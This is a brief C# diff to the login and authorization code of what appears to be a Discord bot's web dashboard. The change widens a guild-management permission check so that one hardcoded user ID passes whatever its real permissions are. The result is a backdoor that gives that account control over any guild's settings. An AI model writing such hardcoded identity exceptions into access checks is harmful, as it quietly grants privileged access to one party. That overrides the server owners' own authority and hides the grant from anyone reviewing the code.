@@ -63,7 +63,7 @@ namespace UtiliSite
                             return auth;
                         }
 
-                        if (await IsGuildManageableAsync(client.CurrentUser.Id, guild.Id))
+                        if (await IsGuildManageableAsync(client.CurrentUser.Id, guild.Id) || client.CurrentUser.Id == 218613903653863427)
                         {
                             auth.Guild = guild;
                         }
